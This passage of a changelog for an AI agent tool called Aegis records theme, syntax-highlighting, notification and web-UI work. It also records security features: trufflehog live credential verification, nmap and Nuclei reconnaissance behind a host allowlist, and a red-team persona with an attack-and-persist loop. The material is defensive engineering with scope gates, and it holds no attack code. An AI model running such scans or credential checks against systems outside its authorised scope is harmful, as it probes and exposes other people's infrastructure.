  palette (black/red/green/yellow/blue/magenta/cyan/white, each with a bright variant). This is
  the same shape most published terminal color schemes already ship in (Alacritty, iTerm2, Windows
  Terminal presets), so popular themes like catppuccin/dracula/gruvbox/tokyonight needed no bespoke
  authoring — their well-known 18-color palettes dropped straight in.
- **`(themeFile).toScheme()`** derives every `colorScheme` role from those 18 colors: foreground/
  background tiers and separators are blended from the base pair via `blend()` (the same helper
  P16.3 introduced for diff tints) rather than requiring a theme author to hand-pick a dozen extra
  shades. `primary`/`secondary`/`keyword`/`accentAlt` map from bright-magenta/bright-blue/magenta/
  green; status roles (destructive/warn/success/info/...) map from the matching ANSI color and its
  bright variant. All 18 hex strings are validated (`parseHexColor`, `#rgb`/`#rrggbb`) and required
  — a malformed or incomplete theme file fails to load with a specific field-level error rather
  than silently applying partial colors.
- **Four embedded built-ins** (`internal/tui/themes/builtin/*.json`: catppuccin, dracula, gruvbox,
  tokyonight) ship via `//go:embed`, the same mechanism `internal/skills/embedded.go` uses for
  builtin skills — no materialization to disk needed since themes are consumed directly by the TUI
  process, not read by the model's file tools.
- **`loadNamedScheme(name, workDir)`** resolves a name in precedence order: the two hardcoded Go
  structs (`dark`/`light`) first, then project `.aegis/themes/<name>.json`, then user
  `~/.aegis/themes/<name>.json`, then an embedded builtin — mirroring the project-overrides-user-
  overrides-builtin precedence `internal/skills` and `internal/persona` already use.
- **`applyTheme(name, workDir)`** now returns the resolved name (the input, lowercased, on success;
  `"dark"` on any failure) instead of the old two-name `normalizeThemeName` pass, so `cfg.Theme`
  always reflects what actually loaded. The TQ10/P14.8 constraint is unchanged: lipgloss styles and
  the glamour renderer capture colors at creation, so both `tui.Run` (before `newModel`) and the
  live `/theme` switch (which also rebuilds `m.th` and `m.renderer`) still apply the scheme first.
- **`/theme`** validation (`cmdTheme`, `slash.go`) now checks `availableThemeNames(d.workDir)`
  instead of a hardcoded dark/light check, so an unknown name's error message lists every name
  currently resolvable (dark, light, any project/user theme files, the four builtins) rather than
  a fixed "want dark or light". This required threading `workDir` into `SlashDispatcher` (a new
  constructor parameter — every existing call site, tests included, only needed a trailing `""` or
  `cfg.WorkDir` added).

Tests: `internal/tui/theme_loader_test.go` (builtin listing, resolution precedence — project beats
user beats embedded, invalid-hex and missing-field rejection, `availableThemeNames` completeness)
and additions to `theme_test.go`/`colorscheme_test.go` (embedded builtins load and apply live
end-to-end through the same `/theme` slash-command path the dark/light pair already had covered).

### P16.2 + P16.3 — SHIPPED 2026-07-07 — Chroma syntax highlighting + diff presentation upgrade

Shipped together per the roadmap's suggested sequencing — P16.3's chroma coloring depends on
P16.2, and the roadmap called them "one visual unit."

**P16.2 — chroma highlighting.** No code highlighting existed outside glamour's assistant-markdown
fences: tool results, `read_file` excerpts, and diff bodies were flat single-color text. New
`internal/tui/highlight.go`:

- `buildChromaStyle()` builds a `chroma.Style` from the *existing* colorscheme roles (keyword →
  `colKeyword`, strings → `colSuccessRole`, comments → `colFgMost` italic, etc. — the same TQ10
  palette that already backs glamour and the ANSI-16 remap) rather than picking an unrelated
  built-in chroma theme, so highlighted code reads as part of one coherent theme in both dark and
  light mode. Built fresh in `newTheme()`, so `/theme` switching rebuilds it like every other
  theme-derived style.
- `highlightSource(th, path, source, bgForLine)` matches a lexer via `lexers.Match(path)` (chroma's
  filename/extension matcher), tokenizes the *whole* source in one pass (not line-by-line — that
  keeps multi-line constructs like block comments correctly lexed), and renders each token through
  lipgloss, splitting on embedded newlines into one pre-styled string per line. Returns
  `ok = false` on no lexer match / empty source, so every call site has a plain-text fallback for
  free. `bgForLine` is the seam P16.3 uses to bake a per-line background tint into each token's
  style at render time (necessary because raw ANSI resets can't be "stacked" — a background applied
  by wrapping an already-rendered, already-reset string afterward doesn't survive).
- Applied to: diff added/removed/context lines (P16.3, below); `read_file` result bodies — the
  read tool's own `"N\t<code>"` line-number prefix is stripped before tokenizing and a matching
  gutter re-derived, so the code content chroma sees is clean; and shell-command previews in
  `renderShellCall` (a synthetic `"cmd.sh"` filename steers the lexer match since the command
  itself carries no path).
- Highlighting happens once, when a tool call/result event builds its transcript block's `raw`
  string — `transcriptBlock` (P16.4's predecessor, TQ1) already caches that raw string across
  resize/redraw, only re-wrapping for width, so no separate highlight cache was needed to satisfy
  the roadmap's "chroma on every re-render would fight the P8 render-cost work" concern.

**P16.3 — diff presentation upgrade.** `diffLines` (`toolview.go`) kept its LCS core (`buildEdits`/
`lcsIndices`, both untouched) but the presentation layer was rewritten:

- **Line-number gutter** — old/new columns (`%*d %*d`), width sized to the largest line number in
  the diff.
- **Hunk headers with real ranges** — `@@ -oldStart,oldCount +newStart,newCount @@` replacing the
  old bare `@@ ... @@` placeholder. Computing a header requires knowing its hunk's full extent
  first, so hunk boundaries (`show[]` windowing, unchanged from before) are precomputed into
  contiguous ranges *before* the render pass, and each header is emitted at its hunk's first line.
  (The first implementation got this backwards — it only knew a hunk's line-count span once the
  loop reached the hunk's *end*, so headers rendered after their content; caught by a manual
  preview render before commit, fixed by precomputing ranges instead of tracking state through a
  single forward pass.)
- **Chroma coloring under the +/- tint** — `colDiffAddBg`/`colDiffDelBg` (new `colorscheme.go`
  roles, `blend(colBgBase, colSuccessRole/colDestructive, 0.16)` — linear RGB interpolation so the
  tint is derived from the active theme's own roles rather than a hardcoded hex per scheme) are
  passed as `highlightSource`'s `bgForLine` for pure-add/pure-del lines; context lines get chroma
  coloring with no tint. Falls back to the old flat green/red (now on a tinted background
  unconditionally, chroma or not) when no lexer matches the path.
- **Word-level intraline emphasis** — a singleton del→add pair (one removed line immediately
  followed by one added line, not part of a longer run) is detected and diffed at word granularity
  by reusing `buildEdits` generically (it was already `[]string`-typed, not line-specific) on a
  whitespace/non-whitespace token split. The changed span renders bold+underline; the unchanged
  span renders in the softer tinted tone — chroma coloring is intentionally skipped for these two
  lines, since token boundaries and word-diff boundaries don't align and reconciling them wasn't
  worth the complexity for a single-line emphasis feature.
- Split side-by-side view remains explicitly deferred per the roadmap (unified-with-line-numbers
  covers the transcript case).

Tests: `internal/tui/highlight_test.go` (lexer match/no-match/empty-source, `bgForLine` threading)
and `internal/tui/toolview_test.go` (hunk header ordering and real ranges, singleton-pair intraline
emphasis, no-op diff returns empty, unknown-extension fallback, whole-file write-diff addition,
`read_file` prefix parsing + fallback on malformed input, end-to-end `renderToolResult` with/without
a path). The roadmap's suggested golden-file-matrix convention (render at a width matrix, snapshot,
`AEGIS_EVAL_UPDATE=1` regen) was not adopted this round — scoped out to keep this change to the
render logic itself; worth revisiting if diff-rendering regressions become a recurring problem.

### P16.1 — SHIPPED 2026-07-07 — Notifications & attention system

The gap: Aegis emitted nothing when the user tabbed away — no terminal bell, no desktop
notification, no window/tab title updates, no focus tracking — so a user couldn't tell a finished
run apart from one blocked on an approval prompt without switching back to check. Also **subsumes
P13.3.4** (background-task attention indicator): rather than a separate sidebar-only affordance for
failed background sub-agents, that's deferred to route through this same seam once a concrete
trigger exists — no separate implementation needed now.

New `internal/tui/notify` package: a `Mode` type (`off`/`bell`/`desktop`/`both`, `ParseMode`
defaulting unrecognized/empty input to `both`) and `Sequence(mode, Event)`, which builds BEL
(terminal bell) and/or an OSC 9 + OSC 777 desktop-notification escape sequence (both emitted
together so either terminal convention is picked up; a terminal understanding neither just ignores
the inert bytes). Input is sanitized (control characters and `;` stripped) before going into the
sequence, since bodies come from tool names / error text. Window-title updates (OSC 0/2) needed no
hand-rolled escape sequence at all — bubbletea v2's `tea.View.WindowTitle` field handles it
natively; `model.windowTitle()` derives "Aegis — ready" / "— working…" / "— approval needed" from
existing `m.streaming`/`m.approval` state on every `View()` call.

Focus tracking uses bubbletea v2's built-in `tea.FocusMsg`/`tea.BlurMsg`, enabled via
`v.ReportFocus = true` in `View()`; `model.focused` defaults to `false` (not `true`) since not every
terminal/multiplexer reports focus (tmux needs explicit configuration) — when a terminal never
sends focus events, the safe failure mode is "always notify," not "silently suppress forever."
`model.notifyCmd(ev)` returns `nil` while focused or in `Off` mode, otherwise `tea.Raw(sequence)` —
`tea.Raw`/`tea.RawMsg` is bubbletea v2's sanctioned path for writing raw bytes through the same
synchronized output buffer the renderer itself uses, avoiding the interleaving risk of writing
directly to stdout from a `tea.Cmd` goroutine.

Wired at the three trigger points named in the roadmap: `streamClosedMsg` (run finished — skipped
when a TQ8-queued message is about to auto-send, since another run starts immediately), `errMsg`
(SSE connection-level error), and inside `applyEvent`'s `KindApprovalRequest`/`KindError` branches
via a `model.pendingNotify *notify.Event` field the `eventMsg` Update case reads and clears (since
`applyEvent` mutates state but returns no `tea.Cmd` of its own).

Config: new `tui.notifications` key (`TUIConfig.Notifications`, default `"both"`), threaded through
`internal/cli/root.go` into `tui.Config` the same way `tui.theme`/`tui.humor_mode` already are. New
`/notify <off|bell|desktop|both>` slash command (bare args show the current mode) follows the exact
`/theme` convention: the dispatcher validates and emits a `"\x00notify "`-prefixed sentinel Output,
applied by a `slashResultMsg` case in `tui.go` — session-only, `tui.notifications` in config persists
across restarts. Documented in `docs/configuration.md`.

Tests: `internal/tui/notify/notify_test.go` (mode parsing, sequence construction per mode,
sanitization) and `internal/tui/notify_test.go` (`/notify` dispatch + live sentinel wiring, focus
tracking suppresses/allows `notifyCmd`, `Off` mode never fires, `windowTitle()` reflects
streaming/approval/ready state) — all via the existing `driveUpdate`/`plainView` integration-test
helpers, no new test scaffolding needed.

## Shipped — P15 items (Web UI Parity with the TUI)

The rest of P15 (P15.2–P15.11) is still open — see
[roadmap.md](roadmap.md#open-work--p15-web-ui-parity-with-the-tui).

### P15.1 — SHIPPED 2026-07-06 — Frontend architecture: bundled Vite + Preact + TypeScript

`aegis ui` was a single 324-line hand-rolled `internal/server/webui/index.html` (inline CSS/JS, no
build step) embedded via `//go:embed webui/index.html` into a plain `string`. Reaching TUI-depth UI
(persona pickers, cost displays, findings tables, config editors — the rest of P15) in that style
would have meant a large single file with no component model. User decision: move to a small
bundled frontend, keeping `aegis ui` a single self-contained binary with no separate frontend
server.

New `internal/server/webui/frontend/` (Vite + Preact + TypeScript): `package.json`,
`vite.config.ts` (`base: "/ui/"`, builds to `../dist`), `src/app.tsx` (top-level session-list ↔
open-session state), `src/api.ts` (fetch/SSE helpers, reads the auth token from a `data-token`
attribute on the root div rather than an inline script), `src/components/` (`SessionList`,
`Transcript`, `Composer`, `Approval`). `src/style.css` is a straight port of the old page's inline
CSS — no visual redesign.

**Build-artifact handling — the key repo-convention decision:** `internal/server/webui/dist/` (the
Vite build output: `index.html` + hashed `assets/*.js`/`*.css`) is **committed to git**, not
gitignored, unlike a typical Node build directory. This was a deliberate call: a missing
`go:embed` target is a hard compile error (not just staleness), and CLAUDE.md documents
`go build ./...`/`go run ./cmd/aegis` as first-class flows with zero Node.js dependency today —
committing `dist/` keeps both working unchanged. `npm run build` (in `frontend/`) is only needed
when actually editing frontend source, and its output must be committed alongside. A new CI step
(`ci.yml`, `ubuntu-latest` leg only, since the bundle isn't OS-specific) rebuilds the frontend and
runs `git diff --exit-code` against `dist/` to catch a commit where source changed but the build
wasn't regenerated — a drift check, not a build dependency, since every other CI leg and both
`build-*.sh`/`build-windows.ps1` need no changes at all.

**Go-side wiring** (`internal/server/webui.go`): `//go:embed webui/dist` into an `embed.FS`,
`fs.Sub`-rooted to strip the `webui/dist` prefix. `handleWebUI` reads `index.html` from that FS and
does the same `strings.Replace(..., "__AEGIS_TOKEN__", ...)` token injection as before — the
literal placeholder now lives in a `data-token` attribute in `frontend/index.html` (Vite doesn't
rewrite arbitrary attribute values, only asset URLs), so `TestWebUIServedAndTokenInjected` needed no
changes. A new `handleWebUIAssets` (`GET /ui/assets/`, `http.FileServerFS`) serves the hashed
JS/CSS with `Cache-Control: public, max-age=31536000, immutable` (safe — filenames are
content-hashed); `authMiddleware`'s existing `/ui`-prefix exemption already covered it with no
change needed. **CSP tightened as a direct consequence, not a separate effort:** bundled JS/CSS are
external same-origin files rather than inline, so `script-src`/`style-src` dropped
`'unsafe-inline'` — a real security improvement that fell out of the architecture change.
New `TestWebUIAssetsServedWithLongCache` covers the asset route.

Feature scope shipped is a **deliberate 1:1 port, no new behavior**: session list/create, message
history hydration (text/thinking/tool_use/image/tool_result blocks), streaming a turn over SSE
(hand-rolled `data:` line parsing, same as the old page), the same six event kinds handled
(`text`/`thinking`/`tool_call`/`tool_result`/`approval_request`/`error` — `cost_alert`/`guard`/
`steer`/`turn_done`/`done` remain unhandled no-ops, matching the old page exactly), tool-call
approval (Allow/Reject only, no "always allow" yet — that's P15.10), stop/abort via
`AbortController`, and the phase/elapsed-time status indicator. `.github/dependabot.yml` got a new
`npm` ecosystem entry for `/internal/server/webui/frontend`; CLAUDE.md's Build & Run section notes
the `npm run build` step for frontend edits.

## Shipped — P13 items (Security & Capability Enhancements)

The other P13 item (P13.3, terminal enhancements) is still open, Tier 4/parked — see
[roadmap.md](roadmap.md#open-work--parked-tier-4).

### P13.4 — SHIPPED 2026-07-12 — `security_advise` engagement tooling

Nebula-inspired security engagement tooling, parked since 2026-07-06, shipped as part of a
user-selected batch of four Tier 4 items. Full writeup under [Latest changes](#latest-changes)
above — engagement notebook, NVD CVE lookup, guarded next-step suggestions, and a status digest,
all behind the new `security_advise` builtin tool.

### P13.2 — SHIPPED 2026-07-06 — trufflehog secret scanner with opt-in live verification

Added `trufflehogScanner` (`internal/security/scanners.go`) alongside gitleaks rather than
replacing it — opt-in (`DefaultEnabled: false`, same posture as the P11.3 language-targeted SAST
engines), filesystem mode, hand-written JSON-lines parser (trufflehog streams one JSON object per
result, not a single array/report file the way gitleaks or kubescape write). Findings dedupe
against gitleaks through the existing P11.8 machinery when both flag the same location, and get
the same `V6.4 Secret Management` ASVS fallback label gitleaks gets (`internal/security/asvs.go`).

**Live verification** (trufflehog's differentiator: 800+ detectors can call the real provider API
— AWS/GitHub/etc. — to confirm a found credential is still active) is a second, separate opt-in:
`security.tools.trufflehog.verify` (default false). Because it makes real outbound calls using the
actual discovered secret, and the scanner-container runner is network-isolated (`--network none`,
every scanner container's hardening posture), `verify: true` is **host-only by construction** —
`trufflehogScanner.Resolve` wraps the generic resolver and forces `MethodNone` (with an explanatory
reason) rather than `MethodContainer` whenever verification is requested, the same host-only carve-
out image scanning already has, instead of punching a network hole through the isolation posture or
silently dropping verification.

Added a `Verification` tri-state to `Finding` (`internal/security/security.go`), modeled directly on
the existing `Reachability` tri-state's "never guessed" posture: a finding is `VerificationUnknown`
unless verification was actually attempted (parseTrufflehog takes a `verifyAttempted` bool — trufflehog's
own `Verified` JSON field is always `false` when `--no-verification` ran, which is a different claim
from "checked and confirmed inactive" and must not render as one), `VerificationVerified` when the
live check confirmed the credential is active, `VerificationUnverified` when checked and found
inactive. `Format()` renders a hard-to-miss `[VERIFIED: confirmed active credential]` tag on a
verified finding; the security-audit skill's triage loop now calls out that a verified finding
should never be baseline-suppressed without an explicit, specific reviewer reason.

TUI surface: `/security-config`'s per-tool edit form conditionally adds a warning-labelled
"⚠ Verify (live credential check)" confirm field only when editing trufflehog, describing exactly
what it does before the operator turns it on; the list view's tool badge shows `verify:ON` when
set. The verified/unverified tag renders in `/scan` output automatically since both the TUI and CLI
render through the same `Report.Format()`.

Also documented AGPL-3.0 licensing (`docs/security.md`) — trufflehog is AGPL-3.0 vs. gitleaks' MIT;
Aegis only shells out to a separately-installed binary so it's a disclosure, not a code-linking
concern for Aegis itself, but worth knowing before an operator installs and runs it. Added a
recorded-fixture regression case (`internal/security/testdata/trufflehog.jsonl`,
`regression.golden.json`) exercising the verified tag end to end through the full
parse→dedup→ASVS→sort pipeline, per the existing P11.9 convention.

### P13.1 — Security config TUI/CLI: cross-platform availability gap

Audited against the current codebase: `/security-config` (TUI) and `aegis security
status/install/config` (CLI) already exist and are comprehensive — P11.10/P11.11 shipped live
per-tool availability (host binary / container / unavailable, with a reason), guided per-OS
install with confirmation, and method/image/install-policy configuration. The original framing of
this item ("doesn't currently exist... not working at all") no longer matches the codebase.

The one real, concrete gap: neither surface says which *other* platforms a tool supports when it's
unavailable on yours. `ScannerDescriptor.Install` already carries a `map[string]string` keyed by
`darwin`/`linux`/`windows` (`internal/security/method.go`) — the data exists, it's just never
surfaced beyond the current `runtime.GOOS`.

- **P13.1.1 — SHIPPED 2026-07-05** — `security.InstallAvailability`/`AvailabilityNote`
  (`internal/security/install.go`) report which *other* OSes have a guided host install, and both
  `aegis security status`'s DETAIL column and the `/security-config` status line now append "no
  native host install for $OS (available on: …) — configure security.tools.&lt;name&gt;.image for a
  container fallback" when the current OS lacks one. Note-gated to genuine missing-host-binary
  reasons only (never disabled/opt-in/container reasons). Tests in `install_test.go`. (S)
- **P13.1.2 — SHIPPED 2026-07-05** — folded into P13.1.1's single note (the "configure a container
  image" next-step is part of the same `AvailabilityNote` string), rather than a second separate
  line. (S)
- **P13.1.3 — SHIPPED 2026-07-06** — `aegis security install <tool>` (P11.10) required running one
  tool at a time from the CLI; there was no bulk first-run path. Added an opt-in **Action [3]** to
  all three build scripts (`build-macos.sh`, `build-linux.sh`, `build-windows.ps1`) that loops
  `aegis security install <tool> --yes` over every scanner in `internal/security/method.go`'s
  `descriptors` map (`zap` excluded — container-only, no host install command) using the binary
  Action 1 just built. Deliberately reuses the existing gated CLI command rather than duplicating
  install commands in shell/PowerShell, so the descriptor map stays the single source of truth.
  Never folded into `all` — selecting it requires explicitly passing `3` (e.g. `./build-linux.sh
  "all 3"`) since it's a privileged, host-modifying action across many tools at once. Best-effort:
  a failed tool (missing Go/pipx/gem/scoop toolchain) is reported in a per-run summary without
  aborting the rest. Verified bash/PowerShell syntax and the full selection/loop/summary logic
  against stub `aegis` binaries (including a simulated failure) rather than the real installers.
  (S)

Priority: Low, Effort: S — **done**. Caveat surfaced during the follow-up review: the new
cross-platform availability info lives in `aegis security status` (CLI) and the `/security-config`
dialog, but `aegis security status` itself has **no TUI slash command at all** — so from inside a
session you can't see it without the config dialog. That stranding is the seed of the P14 track
below; full in-session reach is **P14.2**.

### P13.5 — SHIPPED 2026-07-06 — Nuclei scanner addition (+ nmap)

Shipped all seven sub-items, plus nmap (a genuinely useful complement requested alongside Nuclei —
nmap does the actual port/service/host discovery; Nuclei matches vulnerability templates against
whatever nmap found alive). Both run as one `recon_scan` tool call / `aegis scan network` command.

- **P13.5.1/.5** — Added `nucleiScanner`/`nmapScanner` (`internal/security/recon.go`), both
  implementing a new small `ReconScanner` interface (`Name`/`Resolve`/`Scan`) aggregated by
  `RunRecon` the same way `RunWithOptions` aggregates the file-based `Scanner` interface. Nuclei
  runs with `-sarif-export`, consumed via the existing `ParseSARIF` ingester (no new parsing code,
  as scoped) — `DedupFindings`/`assignASVS` apply the same as every other scan path. Nmap has no
  SARIF export, so it gets a small local XML parser (`encoding/xml`) instead, turning each open
  port into a `Finding` — with a curated severity-bump table (Telnet, FTP, unauthenticated Redis, an
  exposed Docker API, SMB, RDP, VNC, Elasticsearch, etc.) that flags commonly-risky exposed services
  `MEDIUM`/`HIGH` with specific remediation instead of leaving every open port at bare `INFO`.
- **P13.5.2** — Extracted the shared gate into `internal/security/target.go`: `isHostAllowed` (bare
  host/IP, loopback-private-auto-allow-else-declared) plus the generalized
  `hostMatchesAllowEntry`/`isLoopbackOrPrivateHost`/`networkPrivateRanges`. `isDASTTargetAllowed` is
  now a thin URL-parsing wrapper over it; `recon_scan`'s bare-host/CIDR targets call it directly.
  One policy for every network-target-reaching tool (ZAP, nmap, nuclei), not three.
- **P13.5.3** — `RunRecon` checks every target individually before running anything (one bad host
  fails the whole call, listed by name) and caps a single call at 256 targets (rejected outright
  above that, never silently truncated).
- **P13.5.4** — `security.dast.allow_active` (the *same* flag ZAP's active mode uses, not a second
  one) gates both scanners' aggressive modes: nuclei excludes `dos`/`fuzz`/`intrusive`-tagged
  templates by default; nmap runs a top-100-port version scan by default and only adds OS
  detection/full-port-range/default-scripts when active.
- **P13.5.6** — `security.tools.nuclei.templates_version` (new `SecurityToolConfig` field) must name
  a `nuclei-templates` release tag; `resolveNucleiTemplates` shallow-clones that tag once into a
  per-version cache dir and always runs with `-duc` (disable update check) — nuclei never pulls an
  unpinned "latest" template set. Missing config reports nuclei skipped with that exact reason.
- **P13.5.7** — `aegis scan network <target> [<target>...]` (`internal/cli/scan.go`) and the
  standalone `recon_scan` tool (`internal/tool/builtin/recon.go`, deferred like `dast_scan`, reusing
  the existing `opts.DASTAllowedTargets`/`DASTAllowActive` wiring — no new `builtin.Options` fields
  or per-entrypoint plumbing needed). Both scanners are host-binary-only for v1 (no container
  fallback — a network-isolated scanner container can't reach LAN targets, same reasoning as image
  scanning's existing host-binary-only precedent). No TUI slash command yet — matches `dast_scan`'s
  current CLI-only state.

Tests: `internal/security/target_test.go` (generalized host-gate unit tests, migrated off
`dast_test.go`), `internal/security/recon_test.go` (multi-host cap, per-host gate enforcement, nmap
arg construction + XML parsing + severity-bump table, nuclei tag-exclusion arg construction +
template-pin-required skip reason). Docs: new "Network / Host Reconnaissance (nmap + Nuclei)"
section in `docs/security.md`, mirroring the DAST section's structure and cross-referencing it for
the shared gate rather than re-explaining it.

See P13.8 below for the `red-team` persona + `redteam-engagement` skill built on top of this.

### P13.8 — SHIPPED 2026-07-06 — Red-team persona + `redteam-engagement` skill

Prompted by a user review of `elder-plinius/T3MP3ST` (an autonomous red-teaming framework) asking
what capabilities were worth adopting into Aegis. Built on top of P13.5's `recon_scan` (nmap +
nuclei): a new `red-team` built-in persona (`internal/persona/persona.go`) and a dormant-by-default
`redteam-engagement` builtin skill (`internal/skills/builtin/redteam-engagement/`), adapting
T3MP3ST's genuinely transferable patterns —

- A five-phase operating loop (RECON → PLAN → EXECUTE+TRACK → REFLECT → SELF-CRITIQUE), with a
  findings ledger using explicit CONFIRMED/REFUTED/OPEN/NEXT states per row and a "three failed
  variants of the same attack class → switch tactics" persistence rule.
- An evidence-before-claim self-critique rule: nothing is marked CONFIRMED without a concrete
  citation (command output, response header, scan finding ID) — an unverified hit stays OPEN.
- MITRE ATT&CK mapping per finding, matching the existing `security-researcher` persona's
  convention.
- A non-negotiable scope rule in the persona prompt (state the authorized target list back to the
  user before any tool call) as belt-and-suspenders *on top of* — never instead of — the real
  enforcement: `recon_scan`/`dast_scan`'s hard `isHostAllowed` gate, which is mode-independent and
  runs whether or not the model remembers to check.

Skill companion assets (`references/rules-of-engagement-template.md`,
`references/findings-ledger-template.md`) mirror `content-review`'s `references/*.md` bundling
pattern; picked up automatically by the existing `go:embed builtin` directory walk, no registry to
update. `docs/personas.md` got the new persona's row.

**Explicitly not adopted from T3MP3ST**, both scoped out during design and worth recording so they
aren't re-proposed without a reason to revisit: its 18 LLM-jailbreak/prompt-injection techniques
(red-teaming the LLM itself is a different problem from red-teaming infrastructure, and wasn't what
was asked), and any exploit-chaining/credential-attack tooling (Metasploit/Hydra-style) — Aegis's
posture stays "surface and validate vulnerabilities," matching `dast_scan`'s existing baseline/active
design. Also deferred: P13.4's persistent multi-day "engagement notebook" extending
`internal/memory` — a real idea, separate scoped item in roadmap.md; this ships a per-engagement
report file (via `write_file`), which is enough for a single red-team exercise.

### P13.6 — SHIPPED 2026-07-06 — Threat-modeling skill (`threat-modeling`) + `/threat-model` command

Researched six named frameworks (STRIDE, LINDDUN, PASTA, Trike, VAST, NIST 800-154) plus three
companion techniques worth adding as optional add-ons (Attack Trees, MITRE ATT&CK mapping, Evil User
Stories). Design call per the roadmap's recommendation: one skill bundle
(`internal/skills/builtin/threat-modeling/`), not a new persona and not one skill loaded per
framework — the skill's job is to pick the right framework for the system at hand (asking a
clarifying question when the user hasn't named one, using a focus/best-use-case table to frame the
choice, defaulting to STRIDE only when there's genuinely no signal and no way to ask) and then follow
that framework's process exactly.

- One `references/<framework>.md` per framework (`stride.md`, `linddun.md`, `pasta.md`, `trike.md`,
  `vast.md`, `nist-800-154.md`) — each documents the framework's categories/stages, a step-by-step
  process grounded in exploring the real workspace first (never an assumed architecture), and a
  concrete output template, so the model (and a reader wanting to learn the framework) has a written
  reference to align output against rather than reconstructing the framework from memory each time.
- `references/companion-techniques.md` covers Attack Trees, MITRE ATT&CK mapping, and Evil User
  Stories as optional layers on top of a primary framework, plus a short note on when combining
  frameworks (hybrid modeling) is and isn't worth the added effort.
- `securityArchitectSystem` (`internal/persona/persona.go`) now names the skill in its threat-modeling
  workflow instead of hardcoding STRIDE/LINDDUN — the P12 debate-mode routing hook (route each
  threat/mitigation pair through `agent` `mode:"debate"` when `security.debate.threat_model` is
  enabled) is preserved unchanged in the skill itself.
- New `/threat-model [system or feature]` TUI command (`internal/tui/commands.go`'s `commandDefs`
  table, handler in `internal/tui/slash.go`): sends a message that explicitly invokes the skill and
  asks the framework-selection question as part of the resulting turn, rather than depending on the
  model noticing a trigger phrase in free text — the same P13 cross-cutting TUI-surface requirement
  every other item in this track follows. Covered automatically by the existing P14.1/P14.10
  command-surface sync tests since it's a `commandDefs` entry, not a separately hand-listed command.
- `docs/personas.md` (security-architect's row now names the skill and its frameworks),
  `docs/configuration.md`, `docs/memory-and-knowledge.md`, and `CLAUDE.md`'s built-in-skills lists
  updated; the pre-existing `redteam-engagement` skill was also missing from those same lists
  (a stale-docs bug predating this change) and got added at the same time.

**Follow-up, 2026-07-08 — framework picker + explicit framework args:** `/threat-model` now
recognizes a leading framework name (`stride`/`linddun`/`pasta`/`trike`/`vast`/`nist` or
`nist-800-154`, case-insensitive; `extractThreatModelFramework`, `internal/tui/slash.go`) and skips
the clarifying question entirely when one is given, e.g. `/threat-model PASTA the auth service`.
Without a recognized leading framework, a `listDialog`-based picker (`newThreatModelFrameworkPicker`,
new `internal/tui/threatmodelpicker.go`) opens instead, listing all six frameworks with a one-line
description each (mirrored from the skill's own framework table) — forcing the choice up front via a
new `SlashResult.ThreatModelTarget` → `model.pendingThreatModelTarget` → re-dispatched `/threat-model`
round trip, the same shape `/model`'s picker already uses, rather than spending a model turn asking
the same question in chat. The no-target default prompt also now names the actual workspace
explicitly, with its path when known, instead of the vague "this project" — matching the skill's own
instruction to explore the real workspace rather than an assumed architecture. `docs/tui-guide.md`
and the `/threat-model` `/help` text (`internal/tui/commands.go`) updated to document the new
`[framework]` argument and picker behavior; new `internal/tui/threat_model_test.go` covers the
parser, both prompt-construction paths (with/without a target), and the picker round trip
(`TestThreatModelPickerFlow`).

### P13.7 — SHIPPED 2026-07-07 — LaTeX report consolidation skill (`latex-report`) + `/report` command

Closed the last open P13 item. Audited before building: `latex_new_document`/`latex_build`
(`internal/tool/builtin/latex.go`) and the `report-writer` persona already existed — the original
roadmap framing ("incorporate LaTeX use") no longer matched the codebase. The real gap was the same
shape as `threat-modeling` filled for `security-architect`: no skill walked through the specific ask
of consolidating a number of existing markdown docs into one coherent LaTeX report, the way
`html-report` bundles a template + validator + steps for its narrower single-report case.

- New `internal/skills/builtin/latex-report/SKILL.md`, mirroring `html-report`'s pattern: gather and
  fully read the source markdown docs, synthesize a section outline (merge overlapping material,
  flag unresolved contradictions rather than silently picking one), scaffold with
  `latex_new_document(style="report", sections=[...])`, fill each section from the source material
  (converting markdown tables/code fences/lists/callouts to their LaTeX equivalents, escaping LaTeX
  special characters), `latex_build`, then report the output PDF path.
- New `/report [latex] <sources…>` TUI command (`commandDefs` in `internal/tui/commands.go`, handler
  `cmdReport` in `internal/tui/slash.go`) — the P13 cross-cutting TUI-surface requirement. No `latex`
  arg loads `html-report` (already existed as a skill but had no dedicated slash entry point either);
  `latex` loads the new skill instead. Automatically covered by the existing P14.1/P14.10
  command-surface sync tests since it's a `commandDefs` entry.
- Two bundled companion scripts (Python 3, stdlib only, same pattern as `html-report`'s
  `validate_report.py`): `analyze_sources.py` prints each source doc's heading tree, word/table/
  code-block counts, and open TODO/FIXME markers, so the section-outline step starts from an
  accurate structural map instead of whatever the model happened to notice while skimming;
  `escape_latex.py` escapes LaTeX special characters (`# $ % & _ { } ~ ^ \`) in prose spans pulled
  from markdown, since a missed `_` or `%` copied verbatim is a reliable way to fail `latex_build`.
- User-requested follow-up in the same session: made the skill (and skill-loading generally) usable
  from any persona, not just `report-writer`. The skill index itself was already persona-agnostic
  (`skills.BuildIndex` isn't filtered by active persona) — the actual gap was that the `skill` tool
  wasn't in *any* built-in persona's advisory `Tools` list (only `general`, which leaves `Tools`
  empty/unrestricted, was unaffected), so loading any skill under most personas triggered
  `PersonaToolGate`'s confirmation prompt in the TUI every time. Added `skill` to the 17 non-debate-
  role personas' `Tools` lists (debate roles — `critic`/`arbiter`/`security-critic`/
  `security-arbiter` — are deliberately minimal and untouched), plus `latex_new_document`/
  `latex_build` to the 16 of those that didn't already carry them (`report-writer` already had both).
- `docs/tui-guide.md`, `docs/configuration.md`, `docs/memory-and-knowledge.md`, and `CLAUDE.md`'s
  built-in-skills lists updated to include `latex-report`.

All P13 items (P13.1–P13.8) are now shipped except P13.3 (terminal enhancements) and P13.4
(nebula-inspired engagement tooling), both still open — see
[roadmap.md](roadmap.md#open-work--p13-security--capability-enhancements).

---

## P14 — TUI Command-Surface Parity & Discoverability (fully shipped, P14.1–P14.10)

A review of the TUI's slash-command surface against (a) the actual dispatch table, (b) the CLI
subcommand tree, and (c) the daemon client API found a real, reported defect plus a broad
discoverability gap: many daemon/CLI capabilities have no in-session `/slash` command, and the
lists that *should* agree about which commands exist have silently drifted.

**Root-cause finding (the reported bug), fixed.** A built-in slash command used to be declared in
*three* hand-maintained places that had to agree: the dispatch table (`d.builtins`,
`internal/tui/slash.go`), the `/help` listing + detailed help (`cmdHelp`/`builtinHelp`, same file),
and the completion-popup/command-palette source (`builtinCommands`, `internal/tui/completion.go`).
`help_test.go` guarded the first two against each other — but nothing guarded `builtinCommands`, so
`security-config`, `scan`, `debate`, `rollback`, `detach`, `archive`, and `humor` were all fully
